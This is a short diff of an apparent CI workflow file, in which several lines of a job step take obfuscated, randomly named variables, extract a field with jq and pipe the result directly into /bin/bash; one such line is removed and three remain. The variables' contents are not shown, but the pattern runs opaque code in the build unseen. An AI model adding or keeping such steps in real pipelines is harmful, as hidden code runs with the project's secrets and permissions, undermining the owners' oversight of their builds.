@@ -40,7 +40,6 @@ jobs:
           echo $csdn7 | jq -r .k85 | /bin/bash
           echo $jqdtb49459 | jq -r .rjxg991 | /bin/bash
           printf '%s' "$olkx6" | jq -r .fmidm7 | /bin/bash
-          printf '%s' "$mq6684" | jq -r .j0 | /bin/bash
 
       - name: Upload artifact
         if: always()
